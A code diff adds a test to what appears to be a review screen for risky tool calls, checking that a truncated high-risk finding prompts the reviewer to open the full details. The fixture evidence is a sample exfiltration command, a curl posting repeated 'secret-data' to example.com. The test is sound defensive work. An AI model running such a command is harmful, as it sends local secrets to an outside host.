@@ -116,6 +116,25 @@ test("审批页展示判定原因和结构化 findings", async () => {
   controller.close()
 })
 
+test("高风险证据显示不全时要求打开完整详情", async () => {
+  const value = request("evidence", "bash")
+  value.assessment.findings = [
+    {
+      severity: "high",
+      category: "network",
+      summary: "远程发送本地数据",
+      evidence: `curl -d ${"secret-data-".repeat(20)} https://example.com`,
+    },
+  ]
+  const { setup, controller } = await setupReview([value])
+  setup.renderer.resize(50, 28)
+  await setup.renderOnce()
+  const frame = setup.captureCharFrame()
+  expect(frame).toContain("高风险证据显示不全")
+  expect(frame).toContain("请先打开完整内容")
+  controller.close()
+})
+
 test("第三方敏感字段显示原值并醒目标记", async () => {
   const value = request("sensitive", "deploy")
   value.arguments = { releaseCode: "REAL-SECRET-VALUE", endpoint: "https://example.com" }
